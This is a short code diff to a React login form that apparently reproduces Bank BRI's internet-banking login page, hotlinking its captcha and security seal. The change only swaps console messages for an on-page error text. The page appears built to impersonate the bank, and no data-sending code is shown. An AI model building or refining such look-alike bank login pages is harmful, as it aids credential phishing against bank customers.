@@ -18,11 +18,11 @@ import React, { useState } from 'react'
       e.preventDefault()
 
       if (!document.getElementById('userId').value) {
-        console.log('wajib isi');
+        document.getElementById('error').innerText = 'This field is required'
         return
       }
       if (!document.getElementById('password').value) {
-        console.log('wajib isi');
+        document.getElementById('error').innerText = 'This field is required'
         return
       }
 
@@ -49,6 +49,9 @@ import React, { useState } from 'react'
                 <img className="alignimg" src="https://ib.bri.co.id/ib-bri/login/captcha" />
               </div>
             </div>
+            <br/>
+            <br/>
+            <p  className='text-secondary' id='error'></p>
             <button type="submit" id='masuk'>Masuk</button>
             <div style={{float: 'left', width : '100%'}}>
               <a href="https://sealinfo.verisign.com/splash?form_file=fdf/splash.fdf&dn=ib.bri.co.id" className="verisign">
